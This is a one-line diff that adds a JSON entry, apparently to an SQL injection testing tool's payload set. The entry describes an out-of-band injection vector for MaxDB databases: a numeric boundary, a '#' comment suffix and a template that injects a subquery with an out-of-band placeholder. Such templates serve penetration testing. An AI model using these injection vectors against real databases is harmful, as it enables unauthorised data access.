@@ -1,0 +1,1 @@
+{"dbms": "maxdb", "technique": "oob", "boundary": {"prefix": "", "suffix": "#", "type": "numeric"}, "vector": "{B} AND 1=(SELECT ({Q}))/*OOB {OOB}*/", "comment": "maxdb oob: numeric, hash"}
